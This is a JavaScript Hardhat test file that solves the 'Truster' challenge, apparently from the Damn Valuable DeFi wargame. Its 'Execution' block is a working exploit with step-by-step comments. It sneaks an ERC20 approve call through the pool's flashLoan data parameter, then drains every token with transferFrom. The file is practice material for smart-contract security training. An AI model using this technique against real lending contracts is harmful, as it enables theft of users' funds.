const { ethers } = require('hardhat');
const { expect } = require('chai');
const {BigNumber} = require("ethers");
const { keccak256 } = require('@ethersproject/keccak256');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        //1. we get the player address
        const playerAddress = player.address;

        //2. We parse the TOKENS_IN_POOL from bigNumber to string, making it easier to manage it in javascript
        const tokensInString = BigNumber.from(TOKENS_IN_POOL).toString()

        //3. Get the function signature (keccak("approve(address,uint256)")) --> 32bytes hex string
        const functionSelector32bytes = ethers.utils.id("approve(address,uint256)")

        //4. get the first  4 bytes of the function selector
        const functionSelector4bytes = functionSelector32bytes.substring(0,10)

        //5. encode the arguments address(playerAddress) and uint256(TOKENS_IN_POOL) 
        // returns --> 65 bytes hex string ("0x" + 32bytes address and 32 bytes uint256)
        const encodedData = ethers.utils.defaultAbiCoder.encode(["address","uint256"],[playerAddress,tokensInString])

        //6. put everything together in "data" = ("approve(address,uint256)",playerAddress,TOKENS_IN_POOL)
        const data = functionSelector4bytes + encodedData.substring(2);

        //7. call the ERC20 from the Pool.flashLoan and give approval to spend all the tokens from the pool to playerAddress
        const borrowTx = await pool.connect(player).flashLoan(0, player.address, token.address, data);
        await borrowTx.wait()

        //8. transfer all the tokens to player
        const stealTokens = await token.connect(player).transferFrom(pool.address,player.address, TOKENS_IN_POOL);
        await stealTokens.wait()
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});
